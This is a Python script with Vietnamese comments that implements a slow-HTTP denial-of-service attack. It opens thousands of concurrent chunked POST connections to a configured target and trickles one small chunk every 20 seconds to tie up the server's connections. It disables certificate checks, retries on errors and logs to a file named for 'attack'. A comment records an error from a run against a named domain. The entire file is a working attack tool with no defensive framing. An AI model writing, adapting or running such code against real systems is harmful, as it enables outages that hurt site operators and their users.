# stream_chunks_fixed.py
import random
import aiohttp #Chạy bất đồng bộ (async/await), Cho phép chạy nhiều việc cùng lúc mà không phải đợi xong luồng này mới chạy luồng khác
import asyncio #Thư viện hỗ trợ lập trình bất đồng bộ trong Python, giúp viết mã không chặn (non-blocking) và xử lý nhiều tác vụ cùng lúc.
import time #Thư viện cung cấp các hàm liên quan đến thời gian, như đo thời gian thực thi, định dạng thời gian, v.v.
import ssl #Thư viện hỗ trợ các chức năng liên quan đến SSL (Secure Sockets Layer) và TLS (Transport Layer Security) trong Python, giúp thiết lập kết nối mạng an toàn.
import signal
import logging
from pathlib import Path
import sys
from load_config import get_target_config, validate_config

LOG_FILE = Path(__file__).parent / "tanCong.log"
logger = logging.getLogger("tanCong")
logger.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
file_handler = logging.FileHandler(LOG_FILE, encoding="utf-8")
file_handler.setFormatter(formatter)
stream_handler = logging.StreamHandler()
stream_handler.setFormatter(formatter)
logger.addHandler(file_handler)
logger.addHandler(stream_handler)
logger.propagate = False

URL = None
HEADERS = {}
SSL_CONTEXT = None
SHUTDOWN = asyncio.Event()
SESSION = None
config_method = "POST"
STARTED_STREAMS = 0
CONN_ERROR_COUNT = 0
ERROR_LOG_EVERY = 100
STARTUP_SPREAD_SECONDS = 5.0
CONNS = 20000 #5000 D:\storageCodePython\tanCong.py
INTERVAL = 20       # gửi 1 chunk mỗi 20 giây
DURATION = 350      # tổng thời gian giữ kết nối 350
custom_timeout = aiohttp.ClientTimeout(
    total=None,       # Tổng thời gian (không giới hạn)
    connect=30,       # Thời gian chờ kết nối
    sock_connect=30,  # Thời gian chờ socket kết nối
    sock_read=None    # Thời gian chờ đọc (sau khi đã kết nối)
)
sslcontext = ssl.create_default_context() # Tạo một ngữ cảnh SSL mặc định để thiết lập các kết nối an toàn. Tạo bộ quy tắc SSL mặc định Bao gồm: Danh sách CA đáng tin; Kiểm tra hostname; Kiểm tra chữ ký certificate; Phiên bản TLS an toàn;
sslcontext.check_hostname = False # Không kiểm tra hostname trong chứng chỉ SSL. Bỏ qua việc xác minh tên máy chủ khi thiết lập kết nối SSL. Điều này có thể giảm tính bảo mật, vì kết nối có thể không an toàn. KHÔNG kiểm tra: Domain bạn truy cập có đúng với domain trong Certificate không? 
sslcontext.verify_mode = ssl.CERT_NONE # Không kiểm tra tính hợp lệ của chứng chỉ SSL. Bỏ qua việc xác minh chứng chỉ máy chủ khi thiết lập kết nối SSL. Điều này có thể giảm tính bảo mật, vì kết nối có thể không an toàn. KHÔNG kiểm tra: Certificate này có đúng cho domain bạn truy cập không?
#1: lỗi ClientConnectorCertificateError(ConnectionKey(host='duchuynguyen.com.vn', port=443, is_ssl=True, ssl=True, proxy=None, proxy_auth=None, proxy_headers_hash=None), SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:997)'))
async def chunker(duration, idx=None): #hàm bất đồng bộ tạo và gửi các chunk dữ liệu trong khoảng thời gian xác định
    start = time.time()
    i = 0
    try:
        while time.time() - start < duration:
            data = f"chunk {i}\n".encode()
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug(f"[send][{idx}] chunk {i} len={len(data)}")
            yield data
            i += 1
            await asyncio.sleep(INTERVAL)
    except asyncio.CancelledError:
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug(f"chunker #{idx} bị huỷ")
        return

async def send_stream(idx):
    await asyncio.sleep(random.uniform(0, STARTUP_SPREAD_SECONDS))
    global STARTED_STREAMS
    STARTED_STREAMS += 1
    if STARTED_STREAMS <= 10 or STARTED_STREAMS % 1000 == 0:
        logger.info(f"start worker #{STARTED_STREAMS} (idx={idx})")

    while not SHUTDOWN.is_set():
        try:
            logger.info(f"#{idx}: mở luồng kết nối chunked đến mục tiêu")
            request_method = config_method
            request_kwargs = {
                "headers": HEADERS,
                "timeout": custom_timeout,
            }

            if request_method == "POST":
                request_kwargs["data"] = chunker(DURATION, idx=idx)

            async with SESSION.request(request_method, URL, **request_kwargs) as resp:
                logger.info(f"#{idx}: kết nối thành công, status={resp.status}")
                if resp.status in (429, 503):
                    logger.warning(f"#{idx}: server trả về {resp.status}, sleep ngắn")
                    await asyncio.sleep(random.uniform(5, 15))
                    continue

                elif resp.status == 501:
                    logger.error(
                        f"#{idx}: server trả về 501. Target có thể không hỗ trợ {request_method} trên đường dẫn này."
                    )
                    if request_method == "POST":
                        logger.error(
                            "Hãy thử TARGET_METHOD=GET hoặc một path khác chấp nhận POST."
                        )
                    break

                elif resp.status >= 400:
                    logger.warning(f"#{idx}: server trả về lỗi HTTP {resp.status}")
                    await asyncio.sleep(random.uniform(2, 5))
                    continue

                logger.info(f"#{idx}: nhận được status {resp.status}")
                text = await resp.text()
                logger.info(f"#{idx}: độ dài phản hồi={len(text)}")

        except asyncio.CancelledError:
            logger.info(f"#{idx}: task bị huỷ do shutdown")
            raise
        except (aiohttp.ClientConnectorError, aiohttp.ServerTimeoutError, asyncio.TimeoutError) as e:
            global CONN_ERROR_COUNT
            CONN_ERROR_COUNT += 1
            should_log = CONN_ERROR_COUNT % ERROR_LOG_EVERY == 0
            if should_log:
                logger.warning(
                    f"#{idx}: lỗi kết nối/timed out {type(e).__name__}: {e} -- total errors={CONN_ERROR_COUNT}"
                )
            elif logger.isEnabledFor(logging.DEBUG):
                logger.debug(
                    f"#{idx}: lỗi kết nối/timed out {type(e).__name__}: {e}"
                )
            if SHUTDOWN.is_set():
                break
            await asyncio.sleep(1 + random.random() * 2)
            continue
        except aiohttp.ClientError as e:
            logger.warning(f"#{idx}: aiohttp ClientError: {e}")
            if SHUTDOWN.is_set():
                break
            await asyncio.sleep(1 + random.random() * 2)
            continue
        except Exception:
            logger.exception(f"#{idx}: lỗi khi gửi stream")
            if SHUTDOWN.is_set():
                break
            await asyncio.sleep(1 + random.random() * 2)
            continue

        if not SHUTDOWN.is_set():
            await asyncio.sleep(1 + random.random() * 2)

async def main():
    if not validate_config():
        print("[!] Vui lòng cấu hình file attack/.env trước khi chạy!")
        sys.exit(1)

    config = get_target_config()
    scheme = "https" if config["use_ssl"] else "http"
    host = config["hostname"] or config["ip"]
    global URL, HEADERS, SSL_CONTEXT, SESSION
    URL = f"{scheme}://{config['ip']}:{config['port']}{config['path']}"
    HEADERS = {"Host": host}
    if config["use_ssl"]:
        SSL_CONTEXT = ssl.create_default_context()
        SSL_CONTEXT.check_hostname = False
        SSL_CONTEXT.verify_mode = ssl.CERT_NONE
    else:
        SSL_CONTEXT = None

    max_connections = config.get("max_connections", 100)
    concurrent_connections = min(config.get("concurrent_connections", 100), max_connections)
    worker_count = concurrent_connections

    connector = aiohttp.TCPConnector(
        limit=worker_count,
        limit_per_host=worker_count,
        ssl=SSL_CONTEXT,
        enable_cleanup_closed=True,
    )
    SESSION = aiohttp.ClientSession(connector=connector, timeout=custom_timeout)

    logger.info(
        f"Target: {config['ip']} ({host}) port={config['port']} path={config['path']} "
        f"method={config['method']} ssl={config['use_ssl']}"
    )
    logger.info(
        f"Sử dụng tối đa {max_connections} task, đồng thời tối đa {concurrent_connections} kết nối "
        f"(đã giới hạn nếu input CONCURRENT_CONNECTIONS > MAX_CONNECTIONS)"
    )

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, request_shutdown)
        except NotImplementedError:
            pass

    # Suppress noisy ConnectionResetError from aiohttp when the remote
    # server closes the transport while aiohttp is still finalizing
    # the request body write. These surface as "Task exception was never
    # retrieved" in aiohttp internals; ignore the specific message.
    default_handler = loop.get_exception_handler()

    def _exception_handler(loop, context):
        exc = context.get("exception")
        if isinstance(exc, ConnectionResetError) and "Cannot write to closing transport" in str(exc):
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug("Suppressed benign ConnectionResetError from aiohttp: %s", exc)
            return
        if default_handler is not None:
            default_handler(loop, context)
        else:
            loop.default_exception_handler(context)

    loop.set_exception_handler(_exception_handler)
    # Export selected method globally so workers use the configured method
    global config_method, _post_probe_result
    config_method = (config.get("method") or "POST").upper()
    _post_probe_result = None

    # Single OPTIONS probe before spawning workers to avoid the race where
    # many workers start chunked bodies and the server immediately rejects
    # POST (501) which causes aiohttp to raise ConnectionResetError in
    # background writer tasks.
    if config_method == "POST":
        try:
            probe_timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=5)
            async with SESSION.request("OPTIONS", URL, headers=HEADERS, timeout=probe_timeout) as probe:
                allow = probe.headers.get("Allow", "")
                if probe.status == 501:
                    _post_probe_result = False
                    logger.error("OPTIONS probe returned 501 — server rejects POST/transfer-encoding. Aborting.")
                elif "POST" in allow.upper():
                    _post_probe_result = True
                else:
                    _post_probe_result = True
        except Exception as e:
            _post_probe_result = True
            logger.debug("OPTIONS probe failed, allowing POST streaming as fallback: %s", e)

    if config_method == "POST" and _post_probe_result is False:
        logger.error("Target does not accept POST; set TARGET_METHOD=GET or change path. Exiting.")
        await SESSION.close()
        return

    tasks = [asyncio.create_task(send_stream(i+1)) for i in range(worker_count)]
    logger.info(f"Created {len(tasks)} worker tasks (maintaining concurrent active connections)")
    try:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        exception_count = sum(1 for r in results if isinstance(r, Exception))
        if exception_count:
            type_counts = {}
            sample = []
            for r in results:
                if isinstance(r, Exception):
                    name = type(r).__name__
                    type_counts[name] = type_counts.get(name, 0) + 1
                    if len(sample) < 5:
                        sample.append(repr(r))
            logger.warning(
                f"Gather completed with {exception_count} task exceptions: {type_counts} "
                f"examples={sample}"
            )
    except asyncio.CancelledError:
        logger.info("Main task bị huỷ do shutdown")
    finally:
        logger.info("Đang huỷ các task còn lại...")
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        if SESSION is not None:
            await SESSION.close()
        logger.info(f"Tổng lỗi kết nối: {CONN_ERROR_COUNT}")

def request_shutdown():
    if not SHUTDOWN.is_set():
        logger.info("Shutdown signal nhận được, chuẩn bị dừng...")
        SHUTDOWN.set()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Người dùng đã dừng bằng Ctrl+C")
    except Exception:
        logger.exception("Lỗi không lường trước khi chạy main")
